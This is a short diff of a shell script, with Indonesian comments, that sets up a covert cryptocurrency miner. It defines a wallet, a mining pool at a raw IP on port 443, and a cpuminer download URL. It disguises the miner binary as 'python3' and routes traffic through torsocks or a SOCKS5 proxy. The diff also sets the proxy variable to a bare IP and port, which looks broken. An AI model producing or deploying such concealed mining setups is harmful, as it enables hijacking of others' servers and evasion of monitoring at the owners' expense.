@@ -2,7 +2,7 @@
 set -e
 
 # ========= Konfigurasi ==========
-WALLET="BoJ5StVBqLdzvsvQsX2q4J6DCmqYyWbcUH.VPS3"
+WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
 POOL="159.223.48.143"
 PORT="443"
 ALG="power2b"
@@ -11,7 +11,7 @@ BINARY_NAME="python3"  # samaran
 URL="https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 
 # ========= Proxy SOCKS5 (jika tersedia) ==========
-PROXY_BIN=""
+PROXY_BIN="116.100.220.220 1080"
 if command -v torsocks >/dev/null 2>&1; then
   PROXY_BIN="torsocks"
   echo "[*] Menggunakan torsocks untuk SOCKS5 proxy"
